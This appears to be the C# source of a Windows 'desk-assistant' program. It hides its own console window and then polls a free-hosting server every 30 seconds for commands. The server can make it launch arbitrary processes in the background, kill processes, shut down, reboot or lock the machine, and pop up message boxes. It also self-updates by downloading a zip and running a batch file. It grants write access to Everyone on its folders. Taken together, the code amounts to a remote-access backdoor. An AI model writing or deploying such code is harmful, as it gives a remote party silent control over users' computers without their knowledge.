using Newtonsoft.Json;
using System.Diagnostics;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using static DEBUGGER;

class Program
{
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    public static bool canClose = true;
    public static string ProcessFileName = "";
    //public static class MsboxOptions
    //{
    //    enum Buttons
    //    {
    //        OK,
    //        OKCancel,
    //        YesNo,
    //        YesNoCancel
    //    }
    //}

    public static string? computerId = null;

    static async Task Main()
    {
        DebugLogMode();


        bool enableUI = false;
        bool forceInstall = false;
#if DEBUG
        enableUI = true;
        Console.WriteLine("Do you want to force install the update? (Y/N)");
        if (Console.ReadLine()?.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase) ?? false)
        {
            forceInstall = true;
        }
#endif
        bool firstArg = true;
        bool setId = false;
        foreach (string arg in Environment.GetCommandLineArgs())
        {
            if (!firstArg)
            {
                switch (arg.ToLower())
                {
                    case "lowRecouces":
                        // Enable low resources mode
                        Console.WriteLine("Low resources mode");
                        Process currentProcess = Process.GetCurrentProcess();
                        currentProcess.PriorityClass = ProcessPriorityClass.BelowNormal; // Set lower priority
                        break;
                    case "--enableui": //--enableUI to lowercase
                        enableUI = true;
                        Console.WriteLine("-------------------- ENABLED CONSOLE UI --------------------");
                        break;
                    case "--debug":
                        // Enable debug mode
                        Console.WriteLine("Debug mode (debug lines get logged)");
                        if (logMode != LogMode.LogWithLines)
                        {
                            DebugLogMode(1);
                        }
                        break;
                    case "--debugloglines":
                        // Enable debug mode
                        Console.WriteLine("Debug mode with numbers (debug lines get logged with line numbers)");
                        DebugLogMode(3);
                        break;
                    case "--forceinstall": //--forceInstall to lowercase
                        forceInstall = true;
                        break;
                    case "--setid":
                        // Set computer ID
                        setId = true;
                        break;
                    case "--version":
                        // Show version
                        Console.WriteLine("Version: " + VersionInfo.currentVersion);
                        Environment.Exit(0);
                        break;
                    case "--help":
                        // Show help
                        Console.WriteLine("Help:");
                        Console.WriteLine("  --enableUI: Enable the console UI");
                        Console.WriteLine("  --lowRecouces: Enable low resources mode");
                        Console.WriteLine("  --debug: Enable debug mode");
                        Console.WriteLine("  --debugLogLines: Enable debug mode with line numbers");
                        Console.WriteLine("  --forceInstall: Force the installation of updates");
                        Console.WriteLine("  --setId: Set the computer ID");
                        Console.WriteLine("  --help: Show this help message");
                        Console.WriteLine("  --version: Show the version of the program");
                        Environment.Exit(0);
                        break;
                    default:
                        Console.WriteLine("Argument \"" + arg + "\" not recognised");
                        ThrowError(message: "Argument \"" + arg + "\" not recognised", title: "Wrong argument", buttons: 48);
                        break;
                }
            }
            else
            {
                ProcessFileName = arg;
                //Console.WriteLine(ProcessFileName);
                firstArg = false;
            }
        }

        if (!enableUI)
        {
            string currentProcess = Environment.ProcessPath ?? ProcessFileName;
            //Console.WriteLine(currentProcess);
            string arguments = "";
            for (int i = 0; i < Environment.GetCommandLineArgs().Length - 1; i++)
            {
                string arg = Environment.GetCommandLineArgs()[i + 1];
                if (arg != "--enableUI")
                {
                    arguments += arg + " ";
                }
            }
            ProcessStartInfo startInfo = new(currentProcess)
            {
                CreateNoWindow = true,
                Arguments = "--enableUI" + arguments
            };
            //Console.WriteLine(startInfo);
            //Console.WriteLine(ProcessFileName);
            //Console.ReadLine();
            //await Task.Delay(2000);
            Process.Start(startInfo);
            Environment.Exit(0);
        }

        /*if (Environment.ProcessPath != Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "desk-assistant",
                    "assistant",
                    "files",
                    "program",
                    "program",
                    AppDomain.CurrentDomain.FriendlyName))
                {

                }*/
        // Start make_shortcut.bat without a window
        string make_shortcutPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "desk-assistant",
            "assistant",
            "files",
            "program",
            "program",
            "make_shortcut.bat");

        if (File.Exists(make_shortcutPath))
        {
            ProcessStartInfo make_shortcutStartInfo = new(make_shortcutPath)
            {
                CreateNoWindow = true
            };
            Process.Start(make_shortcutStartInfo);
        }
        else
        {
            await Version.CheckForUpdates(true);
        }


        LogDebug(VersionInfo.currentVersion);


        Dictionary<string, object>? configInfo = null;
        string computer_id_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                   "desk-assistant",
                                   "assistant",
                                   "files",
                                   "program",
                                   "program",
                                   "config.json");
        try
        {
            if (!File.Exists(computer_id_path))
            {
                File.WriteAllText(computer_id_path, "{\"computer_id\": null}");
            }

            string jsonString = File.ReadAllText(computer_id_path);
            configInfo = JsonConvert.DeserializeObject<Dictionary<string, object>?>(jsonString);

            if (configInfo != null && configInfo.ContainsKey("computer_id") && configInfo["computer_id"] is string)
            {
                computerId = (string)configInfo["computer_id"];
            }
            else
            {
                LogDebug("Computer ID not found in config file.");
            }

            if (setId && enableUI)
            {
                Console.WriteLine(computerId == null ? "Do you want to set the computer ID? (Y/N)" : $"Set computer ID: {computerId}\nDo you want to change it? (Y/N)");
                if (Console.ReadLine()?.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase) ?? false)
                {
                    string? readline = Console.ReadLine();
                    computerId = readline ?? throw new ArgumentException("No input received for computerId");
                    File.WriteAllText(computer_id_path, "{\"computer_id\": \"" + computerId + "\"}");
                }
            }
        }
        catch (JsonException ex)
        {
            LogDebug("Error deserializing config file: " + ex.Message);
        }
        catch (IOException ex)
        {
            LogDebug("File error: " + ex.Message);
        }
        catch (UnauthorizedAccessException ex)
        {
            LogDebug("Access error: " + ex.Message);
        }
        catch (Exception ex)
        {
            LogDebug("Error: " + ex.Message);
        }

        if (computerId == null)
        {
            LogDebug("Computer ID not found. Setting computer ID to default value. (\"default\")");
            computerId = "default";
        }








        _ = await CheckUpdatesAsync(forceInstall); // Werkt eindelijk

        //_ = ThrowError(message: "Test 0.1.2 12:55 14/02/2024", title: "info", buttons: );



        //string computerId = GetCommands.GetId() ?? throw new Exception("Error getting computer ID");
        while (true)
        {
            // Get commands
            Dictionary<string, object>? command = (Dictionary<string, object>?)await GetCommands.GetCmds(computerId);
            if (command != null && command.ContainsKey("command"))
            {
                // Execute command
                GetCommands.SwitchCmds(command);
            }
            // Wait for 30 seconds
            await Task.Delay(30000);
        }
    }


    /// <summary>
    /// Shows a message in a message box.
    /// </summary>
    /// <param name="message">The error message to display. Default value is "Something went wrong."</param>
    /// <param name="title">The title of the message box. Default value is "Error".</param>
    /// <param name="buttons">The buttons to display in the message box. Default value is 16 (OK button).</param>
    /// <returns>The result of the message box operation.</returns>
    public static int ThrowError(
        string message = "Something went wrong.",
        string title = "Error",
        uint buttons = 16)
    {
        return MessageBox(IntPtr.Zero, message, title, buttons + 4096);
    }


    static async Task<bool> CheckUpdatesAsync(bool forceInstall = false)
    {
        // Check for updates
        //VersionInfo versionInfo = new();

        // Create an instance of the Version class
        //Version versionChecker = new();

        // Call the non-static method CheckForUpdates on the instance and asynchronously wait for its completion
        return await Version.CheckForUpdates(forceInstall);
    }
}
static class VersionInfo
{
    public static readonly string currentVersion = "0.1.5";
    public static string versionUrl = "http://site-mm.rf.gd/v/";
    public static bool debug = false;
}















#pragma warning disable CA1050 // Declare types in namespaces
public static class GetCommands
#pragma warning restore CA1050 // Declare types in namespaces
{
    /// <summary>
    /// Retrieves the commands for a specific computer.
    /// </summary>
    /// <param name="computerId">The ID of the computer.</param>
    /// <returns>The dictionary containing the commands, or null if no commands are received.</returns>
    public static async Task<object?> GetCmds(string computerId)
    {
        Dictionary<string, object>? command = null; // Declare variable at the start of the method

        using HttpClient client = new();
        string url = VersionInfo.versionUrl + "commands/get.php";
        int maxRetries = 5;
        for (int attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
                var data = new Dictionary<string, string>
                {
                    { "computer_id", computerId }
                };
                var content = new FormUrlEncodedContent(data);
                var response = await client.PostAsync(url, content);

                if (response.IsSuccessStatusCode)
                {
                    string responseContent = await response.Content.ReadAsStringAsync();
                    var jsonResponse = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(responseContent) ?? throw new Exception("Error reading response from server");
                    foreach (var item in jsonResponse)
                    {
                        if (item.ContainsKey("error"))
                        {
                            LogDebug("Error: " + item["error"]);
                        }
                        else
                        {
                            string key = "command";
                            if (item.ContainsKey(key))
                            {
                                command = item;
                                break; // If successful, break out of the loop
                            }
                            else
                            {
                                LogDebug("The response does not contain the expected key: " + key);
                            }
                        }
                    }
                }
                else
                {
                    string responseContent = await response.Content.ReadAsStringAsync();
                    throw new HttpRequestException($"Response status code does not indicate success: {(int)response.StatusCode} ({response.StatusCode}).\nServer message: {responseContent}");
                }
            }
            catch (HttpRequestException e)
            {
                LogDebug("\nException Caught!");
                LogDebug("Message: " + e.Message);
                if (attempt < maxRetries - 1) // If this wasn't the last attempt
                {
                    LogDebug("Retrying in 10 seconds...");
                    await Task.Delay(TimeSpan.FromSeconds(10)); // Wait 10 seconds before the next attempt
                }
                else
                {
                    LogDebug("Max retries exceeded. Giving up.");
                }
            }
            catch (Exception e)
            {
                LogDebug("\nException Caught!");
                LogDebug("Message: " + e.Message);
                if (attempt < maxRetries - 1) // If this wasn't the last attempt
                {
                    LogDebug("Retrying in 10 seconds...");
                    await Task.Delay(TimeSpan.FromSeconds(10)); // Wait 10 seconds before the next attempt
                }
                else
                {
                    LogDebug("Max retries exceeded. Giving up.");
                }
            }
        }
        if (command == null)
        {
            LogDebug("No commands received.");
            return null;
        }
        else
        {
            return command;
        }
    }


    /// <summary>
    /// Executes the command given in the command dictionary.
    /// </summary>
    /// <param name="command">The command dictionary.</param>
    /// <returns>Returns true if the command was successfully executed; otherwise, false.</returns>
    public static bool SwitchCmds(Dictionary<string, object>? command)
    {
        if (command != null)
        {
            Dictionary<string, string>? parameters = command["parameters"] != null ? JsonConvert.DeserializeObject<Dictionary<string, string>>((string)command["parameters"]) : null;
            string commandKey = "command";
            string? lowerCaseCommand;
            if (command.ContainsKey(commandKey) && command[commandKey] != null)
            {
                lowerCaseCommand = command[commandKey]?.ToString()?.ToLower();
            }
            else
            {
                return false;
            }
            switch (lowerCaseCommand)
            {
                case "showmessage":
                case "showMessage":
                case "message":
                    if (parameters != null)
                    {
                        string message = parameters.ContainsKey("message") ? parameters["message"] : "Something went wrong.";
                        string title = parameters.ContainsKey("title") ? parameters["title"] : "Error";
                        uint buttons = parameters.ContainsKey("buttons") && uint.TryParse(parameters["buttons"], out uint buttonValue) ? buttonValue : 0;
                        Program.ThrowError(message: message, title: title, buttons: buttons);
                    }
                    else
                    {
                        Program.ThrowError(message: "Something went wrong.", title: "Error", buttons: 0);
                    }
                    //Program.ThrowError(message: "Test 0.1.2 12:55 14/02/2024", title: "info", buttons: 0);
                    break;
                case "shutdown":
                case "poweroff":
                    Process.Start("shutdown", "/s /t 0");
                    break;
                case "restart":
                case "reboot":
                    Process.Start("shutdown", "/r /t 0");
                    break;
                case "logoff":
                case "logout":
                    Process.Start("shutdown", "/l");
                    break;
                case "lock":
                case "lockworkstation":
                    [DllImport("user32.dll", SetLastError = true)]
                    static extern bool LockWorkStation();
                    LockWorkStation();
                    break;
                case "forceinstall":
                case "checkforupdates":
                case "update":
                case "forceupdate":
                case "install":
                    _ = Version.CheckForUpdates(true);
                    break;
            
                case "openbrowser":
                case "openwebpage":
                case "openurl":
                    const string DefaultUrl = "https://www.google.com";
                    string urlToOpen = DefaultUrl;

                    if (parameters != null && parameters.ContainsKey("url"))
                    {
                        urlToOpen = parameters["url"];
                    }

                    if (Uri.IsWellFormedUriString(urlToOpen, UriKind.Absolute))
                    {
                        try
                        {
                            Process.Start(urlToOpen);
                        }
                        catch (Exception ex)
                        {
                            // Log or handle the exception
                            Console.WriteLine($"Failed to open URL: {ex.Message}");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"Invalid URL: {urlToOpen}");
                    }
                    break;
                case "killprocess":
                case "endprocess":
                case "terminateprocess":
                    if (parameters != null && parameters.ContainsKey("processname"))
                    {
                        string processName = parameters["processname"];
                        Process[] processes = Process.GetProcessesByName(processName);
                        foreach (Process process in processes)
                        {
                            if (process.ProcessName.ToLower() == processName.ToLower())
                            {
                                // Try to send a close message
                                bool closeMessageSent = process.CloseMainWindow();

                                if (!closeMessageSent)
                                {
                                    // If the close message wasn't sent, force close the process
                                    process.Kill();
                                }
                            }
                        }
                    }
                    break;
                case "startprocess":
                case "runprocess":
                case "execute":
                    if (parameters != null && parameters.ContainsKey("processname"))
                    {
                        if (parameters.ContainsKey("background") && bool.TryParse(parameters["background"], out bool background) && background)
                        {
                            string processNameParam = parameters["processname"];
                            ProcessStartInfo startInfoParam = new(processNameParam)
                            {
                                CreateNoWindow = true
                            };
                            Process.Start(startInfoParam);
                        }
                        else
                        {
                            string processNameParam = parameters["processname"];
                            ProcessStartInfo startInfoParam = new(processNameParam);
                            Process.Start(startInfoParam);
                        }
                    }
                    break;
                default:
                    return false;
            }
            Console.WriteLine("Command: " + (string)command["command"] + " --- Parameters: " + (string)command["parameters"]);
            return true;
        }
        return false;
    }
}











class Version
{
    /// <summary>
    /// Checks for updates and applies them if necessary.
    /// </summary>
    /// <param name="forceInstall">Indicates whether to force the installation of updates.</param>
    /// <returns>True if updates were checked and applied successfully, false otherwise.</returns>
    public static async Task<bool> CheckForUpdates(bool forceInstall = false)
    {
        Program.canClose = false;

        try
        {
            if (VersionInfo.debug)
            {
                VersionInfo.versionUrl = "https://site-mm.000webhostapp.com/v/debug/";
            }

            using HttpClient client = new();

            // Haal het versienummer van de nieuwste versie op van de externe bron
            string latestVersion = await client.GetStringAsync(VersionInfo.versionUrl + "version.txt");

            // Vergelijk de versienummers
            if (IsUpdateAvailable(VersionInfo.currentVersion, latestVersion))
            {
                Console.WriteLine($"A new version is available: {latestVersion}");

                // Voer hier logica uit om de update toe te passen indien gewenst
                //string response = Console.ReadLine() ?? "N";
                //string response = "Y";

                //if (response != null && response.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase))
                //{
                Console.WriteLine("Installing update...\n");
                // Download de update
                // Backup van de huidige bestanden

                // Hier zou je de logica moeten toevoegen om de updatebestanden te downloaden en de oude bestanden te vervangen.
                _ = await DownloadUpdateAsync(VersionInfo.versionUrl, latestVersion);

                Environment.Exit(0);
                // Restart the application
                //Console.WriteLine("The application is restarting...\n\n\n");
                //Thread.Sleep(1000); // Wait a moment
                // Start a new process to replace the current process
                //Process.Start(Environment.ProcessPath);
                // Exit the current process
                //Environment.Exit(0);
                return true;
                //}
                //else
                //{
                //    Console.WriteLine("De update is geannuleerd.");
                //}
            }
            else
            {
                Console.WriteLine("You have the newest version.");

                // Voer hier logica uit om de update toe te passen indien gewenst
                //string response = Console.ReadLine() ?? "N";
                string response = "N";
                if (forceInstall)
                {
                    response = "Y";
                }

                if (response != null && response.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine("Updating anyway...\n");
                    // Download de update
                    // Backup van de huidige bestanden

                    // Hier zou je de logica moeten toevoegen om de updatebestanden te downloaden en de oude bestanden te vervangen.
                    _ = await DownloadUpdateAsync(VersionInfo.versionUrl, latestVersion);

                    Environment.Exit(0);
                    // Restart the application
                    //Console.WriteLine("The application is restarting...\n\n\n");
                    //Thread.Sleep(1000); // Wait a moment
                    // Start a new process to replace the current process
                    //Process.Start(Environment.ProcessPath);
                    // Exit the current process
                    //Environment.Exit(0);
                    return true;
                }
                else
                {
                    Console.WriteLine("Update canceled.");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error while checking for updates: {ex.Message}");
        }
        finally
        {
            Program.canClose = true;
        }

        return false;
    }

    /// <summary>
    /// Determines if an update is available based on the current version and the latest version.
    /// </summary>
    /// <param name="currentVersion">The current version of the software.</param>
    /// <param name="latestVersion">The latest version of the software.</param>
    /// <returns>True if an update is available, false otherwise.</returns>
    static bool IsUpdateAvailable(
        string currentVersion,
        string latestVersion)
    {
        // Voer hier logica uit om te bepalen of een update beschikbaar is
        // Dit kan bijvoorbeeld een vergelijking van versienummers zijn.

        // Hier is een eenvoudige vergelijking, maar het kan complexer zijn
        return string.Compare(currentVersion, latestVersion) < 0;
    }

    /// <summary>
    /// Downloads the update asynchronously, and installs it.
    /// </summary>
    /// <param name="versionUrl">The URL of the version.</param>
    /// <param name="latestVersion">The latest version.</param>
    /// <returns>A task representing the asynchronous operation. The task result is a boolean indicating whether the update was downloaded successfully.</returns>
    static async Task<bool> DownloadUpdateAsync(string versionUrl, string latestVersion)
    {
        try
        {
            using HttpClient client = new();

            // DEBUG
            LogDebug("\n\n\nUpdating...\n");

            string installDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "desk-assistant", "assistant", "files", "program");
            LogDebug("install directory: " + installDir);
            //Console.WriteLine($"Proceed? (Y/N) installDir: {installDir}");
            /* string response = "Y"; //Console.ReadLine() ?? "N";
            if (!(response != null && response.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase)))
            {
                Console.WriteLine("Exiting program...");
                Environment.Exit(0);
            } */
            if (!EnsureDirExists(installDir))
            {
                LogDebug("installDir doesn't exist yet");
            }

            LogDebug("Downloading update...");

            var progress = new Progress<double>();
            double previousProgress = -1;
            DateTime lastUpdate = DateTime.MinValue;
            //int totalBlocks = 40;
            int totalBlocks = Console.WindowWidth - 10;

            // Store the original console color
            ConsoleColor originalColor = Console.ForegroundColor;

            progress.ProgressChanged += (s, e) =>
            {
                // Only update the progress bar if the percentage has changed and at least 20 milliseconds have passed
                if (Math.Floor(e * 2) != Math.Floor(previousProgress * 2) && (DateTime.Now - lastUpdate).TotalMilliseconds > 20)
                {
                    // Calculate completed and remaining blocks
                    int completedBlocks = (int)(e / 100 * totalBlocks);
                    int remainingBlocks = totalBlocks - completedBlocks;

                    // Construct the progress bar string
                    string progressBar = $"[{new string('#', completedBlocks)}{new string('-', remainingBlocks)}] {Math.Floor(e)}%";

                    // Change the color of the progress bar based on the progress
                    Console.ForegroundColor = (e >= 98) ? ConsoleColor.Green : originalColor;

                    // Clear the current line and write the progress bar
                    Console.Write("\r" + progressBar.PadRight(Console.WindowWidth - 1));

                    // Reset the color back to the original color
                    if (e >= 98)
                    {
                        Console.ForegroundColor = originalColor;
                    }

                    // Update previous progress and last update time
                    previousProgress = e;
                    lastUpdate = DateTime.Now;
                }
            };

            Console.Write("\n");

            // Download the update file
            byte[] updateBytes = await DownloadDataWithProgress(versionUrl + "data/newest/update.zip", progress);

            LogDebug("Saving files...");

            // Sla het updatebestand op
            string updateFileName = "update.zip"; // Geef een bestandsnaam op
            string updateFilePath = Path.Combine(installDir, "updates", "version", latestVersion, updateFileName);
#pragma warning disable CS8604 // Possible null reference argument.
            EnsureDirExists(Path.GetDirectoryName(updateFilePath)); // Zorg ervoor dat de map bestaat
#pragma warning restore CS8604 // Possible null reference argument.

            // Gebruik FileStream om het bestand te schrijven
            using (FileStream fileStream = new(updateFilePath, FileMode.Create, FileAccess.Write))
            {
                await fileStream.WriteAsync(updateBytes);
                await fileStream.FlushAsync();
            }

            LogDebug("Extracting update...");

            // Uitpakken van het zip-bestand
            string extractpath = Path.Combine(installDir, "temp", "update");
            Console.WriteLine("");
            if (Directory.Exists(extractpath))
            {
                Directory.Delete(extractpath, true);
            }
            EnsureDirExists(extractpath);
            ExtractZip(updateFilePath, extractpath);

            string destinationPath = Path.Combine(installDir, "program");

            LogDebug("Installing helpapp.bat...");
            EnsureDirExists(destinationPath);
            File.Copy(Path.Combine(extractpath, "helpapp.bat"), Path.Combine(destinationPath, "helpapp.bat"), true);

            // Logica om de oude bestanden te vervangen
            Console.WriteLine("\n\n\nUpdate is downloaded and extracted. Applying update...");
            StartHelpApp(extractpath, destinationPath, installDir);
            Environment.Exit(0);
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error downloading or applying update: {ex.Message}");
            return false;
        }
    }

    static async Task<byte[]> DownloadDataWithProgress(string url, IProgress<double> progress)
    {
        using var client = new HttpClient();
        using var response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);

        var contentLength = response.Content.Headers.ContentLength.GetValueOrDefault(-1L);
        var totalBytes = 0L;
        var readBuffer = new byte[8192];

        using var download = await response.Content.ReadAsStreamAsync();
        using var ms = new MemoryStream();

        while (true)
        {
            var bytesRead = await download.ReadAsync(readBuffer);
            if (bytesRead == 0)
            {
                return ms.ToArray();
            }

            await ms.WriteAsync(readBuffer, 0, bytesRead);
            totalBytes += bytesRead;

            if (contentLength != -1L)
            {
                progress.Report((totalBytes / (double)contentLength) * 100);
            }
        }
    }

    static void StartHelpApp(string beginPath, string destinationPath, string installDir)
    {
        string helperAppPath = Path.Combine(installDir, "program", "helpapp.bat");
        string starterProgram = Environment.ProcessPath ?? Environment.GetCommandLineArgs()[0] ?? Path.Combine(installDir, "program", "MessageTestBlank1.exe");
        Process.Start(helperAppPath, $"{beginPath} {destinationPath} \"{starterProgram}\" false");
        Environment.Exit(0);
    }

    static void ExtractZip(string zipFilePath, string extractPath)
    {
        try
        {
            ZipFile.ExtractToDirectory(zipFilePath, extractPath);
            Console.WriteLine("Update is extracted.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error extracting update: {ex.Message}");
        }
    }



    static bool EnsureDirExists(string path)
    {
        if (!Directory.Exists(path))
        {
            try
            {
                if (Environment.OSVersion.Platform == PlatformID.Win32NT)
                {
                    LogDebug("Test 1");
                    // Maak een nieuwe DirectorySecurity-object om de machtigingen te beheren
                    DirectorySecurity directorySecurity = new();

                    LogDebug("Test 2");

                    // Krijg de SID voor de "Everyone" groep
                    SecurityIdentifier everyoneSid = new(WellKnownSidType.WorldSid, null);

                    LogDebug("Test 3");

                    // Voeg de gewenste machtigingen toe (bijv. schrijfmachtigingen voor iedereen)
                    directorySecurity.AddAccessRule(new FileSystemAccessRule(everyoneSid, FileSystemRights.Write, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));

                    LogDebug("Test 4");

                    // Krijg toegang tot de directory en pas de nieuwe machtigingen toe
                    DirectoryInfo directoryInfo = new(path);

                    LogDebug("Test 5");

                    directoryInfo.SetAccessControl(directorySecurity);

                    LogDebug("Test 6");

                    Console.WriteLine("Toestemming verleend. Je kunt naar de opgegeven locatie schrijven.");

                    // Voer hier je schrijflogica uit
                    // Bijvoorbeeld: File.WriteAllText(Path.Combine(targetPath, "bestand.txt"), "Hallo, wereld!");

                    return true;
                }
                else
                {
                    // Als het geen Windows is, spring meteen naar het catch-gedeelte
                    throw new PlatformNotSupportedException("Only Windows supported. Trying another way...");
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine($"Toestemming geweigerd: {ex.Message}");
                return false;
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Error: {ex.Message}");
                _ = ex;
                Directory.CreateDirectory(path);
                return false;
            }
        }
        else
        {
            return true;
        }
    }

}

class DEBUGGER
{
    public static LogMode logMode = LogMode.Auto;

    public enum LogMode
    {
        Skip = 0,
        Log = 1,
        Auto = 2,
        LogWithLines = 3
    }
    public static void LogDebug(string message, bool forceLog = false, bool logLineNumber = false)
    {
        StackTrace stackTrace = new(true);
#pragma warning disable CS8600 // Converting null literal or possible null value to non-nullable type.
#pragma warning disable CS8602 // Dereference of a possibly null reference.
        StackFrame frame = stackTrace.GetFrame(1); // 0 is the current method, 1 is the caller
        int lineNumber = frame.GetFileLineNumber();
#pragma warning restore CS8602 // Dereference of a possibly null reference.
#pragma warning restore CS8600 // Converting null literal or possible null value to non-nullable type.

        if (logMode == LogMode.Log || forceLog)
        {
            if (logLineNumber)
            {
                Console.WriteLine($"DEBUG --> {message} at line {lineNumber}");
            }
            else
            {
                Console.WriteLine($"DEBUG --> {message}");
            }
        }
        else if (logMode == LogMode.Auto)
        {
#if DEBUG
            Console.WriteLine($"DEBUG; {message} at line {lineNumber}");
#endif
        }
        else if (logMode == LogMode.LogWithLines)
        {
            Console.WriteLine($"DEBUG; {message} at line {lineNumber}");
        }
    }

    public static void DebugLogMode(int mode = 2)
    {
        logMode = (LogMode)mode;
    }
}